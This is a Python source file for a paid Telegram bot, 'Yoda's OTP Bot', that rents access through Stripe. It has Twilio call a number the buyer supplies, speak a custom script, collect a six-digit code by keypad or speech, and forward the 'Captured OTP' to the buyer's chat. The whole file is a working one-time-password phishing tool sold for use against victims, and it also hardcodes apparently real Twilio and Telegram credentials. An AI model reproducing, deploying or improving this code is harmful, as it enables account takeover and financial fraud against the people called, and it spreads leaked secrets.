import asyncio
import threading
from datetime import datetime, timedelta, timezone
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import stripe
import requests

# -------------------------
# Config
# -------------------------
TWILIO_ACCOUNT_SID = "ACd5dfa4d64ce837519f56fc47fb0f28e3"
TWILIO_AUTH_TOKEN = "2599dccc76cd9f0d0e43d2246a4ca905"
TWILIO_PHONE_NUMBER = "+18319992984"
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

TELEGRAM_TOKEN = "8132484421:AAGxuNJGTn_QPZO1Etb0X7bPyw31BoTho74"
NGROK_URL = "https://your-ngrok-url"  # Replace with your public URL

STRIPE_SECRET_KEY = "sk_live_..."  # Your stripe key
stripe.api_key = STRIPE_SECRET_KEY

# -------------------------
# State storage
# -------------------------
user_phone = {}
phone_to_chat = {}
captured_otp = {}
last_message = {}
paid_users = {}

# -------------------------
# Helpers
# -------------------------
def is_paid(user_id):
    return user_id in paid_users and datetime.now(timezone.utc) < paid_users[user_id]

def get_main_keyboard(user_id):
    keyboard = [[InlineKeyboardButton("📱 Set Phone", callback_data="setphone")]]
    if not is_paid(user_id):
        keyboard.insert(1, [InlineKeyboardButton("💳 Pay $25 / 4 Days", callback_data="pay")])
    if user_id in user_phone:
        keyboard[0].append(InlineKeyboardButton("📞 Make Call", callback_data="call"))
    keyboard.append([InlineKeyboardButton("ℹ️ Help / Usage", callback_data="help")])
    return InlineKeyboardMarkup(keyboard)

def create_checkout_session(user_id, customer_email=None):
    session = stripe.checkout.Session.create(
        payment_method_types=["card"],
        line_items=[{
            "price_data": {"currency": "usd", "product_data": {"name": "4-Day Access"}, "unit_amount": 2500},
            "quantity": 1,
        }],
        mode="payment",
        customer_email=customer_email,
        success_url=f"{NGROK_URL}/success?user_id={user_id}",
        cancel_url=f"{NGROK_URL}/cancel"
    )
    return session.url

# -------------------------
# Telegram bot handlers
# -------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Yoda's OTP Bot!\nUse the buttons below:",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    await context.bot.send_message(
        chat_id=chat_id,
        text="ℹ️ How to use:\n1. Set Phone\n2. Make Call\n3. Capture OTP",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "pay":
        url = create_checkout_session(uid)
        await context.bot.send_message(chat_id=uid, text=f"💳 Complete payment: {url}")
        return

    if query.data in ["setphone", "call"] and not is_paid(uid):
        await context.bot.send_message(chat_id=uid, text="💰 You must pay $25 for 4 days.")
        return

    if query.data == "setphone":
        await query.edit_message_text("📱 Send your phone number (format +1XXXXXXXXXX)")
        context.user_data["awaiting_phone"] = True
    elif query.data == "call":
        if uid not in user_phone:
            await query.edit_message_text("⚠️ Set phone first.")
        else:
            await query.edit_message_text("📞 Send your custom message for the call.")
            context.user_data["awaiting_message"] = True
    elif query.data == "help":
        await help_command(update, context)
    elif query.data == "menu":
        await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()

    if not is_paid(uid):
        await update.message.reply_text("💰 Payment required.")
        return

    if context.user_data.get("awaiting_phone"):
        user_phone[uid] = text
        phone_to_chat[text] = update.effective_chat.id
        context.user_data["awaiting_phone"] = False
        await update.message.reply_text(f"✅ Phone saved: {text}", reply_markup=get_main_keyboard(uid))
        return

    if context.user_data.get("awaiting_message"):
        last_message[uid] = text
        context.user_data["awaiting_message"] = False
        phone = user_phone[uid]
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{NGROK_URL}/voice?msg={requests.utils.quote(text)}"
        )
        await update.message.reply_text(f"📞 Calling {phone} now...")

# -------------------------
# Bot setup
# -------------------------
bot_app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
bot_app.add_handler(CommandHandler("start", start))
bot_app.add_handler(CallbackQueryHandler(handle_buttons))
bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

# -------------------------
# Flask server
# -------------------------
flask_app = Flask(__name__)

@flask_app.route("/voice", methods=["POST"])
def voice():
    message = request.args.get("msg", "Enter OTP now.")
    resp = VoiceResponse()
    gather = Gather(input="dtmf speech", timeout=10, num_digits=6, action="/capture", method="POST")
    gather.say(message)
    resp.append(gather)
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/capture", methods=["POST"])
def capture():
    otp = request.values.get("Digits") or request.values.get("SpeechResult")
    phone = request.values.get("To") or request.values.get("From")
    captured_otp[phone] = otp
    chat_id = phone_to_chat.get(phone)
    if chat_id:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                      data={"chat_id": chat_id, "text": f"📩 Captured OTP: {otp}"})
    resp = VoiceResponse()
    resp.say("Thanks! OTP captured. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/success")
def payment_success():
    user_id = int(request.args.get("user_id"))
    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
    return f"✅ Payment received. Access granted for 4 days."

@flask_app.route("/cancel")
def payment_cancel():
    return "Payment canceled."

def run_flask():
    flask_app.run(host="0.0.0.0", port=5000)

# -------------------------
# Run both Flask & Telegram bot
# -------------------------
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    asyncio.run(bot_app.run_polling())  # ✅ polling only
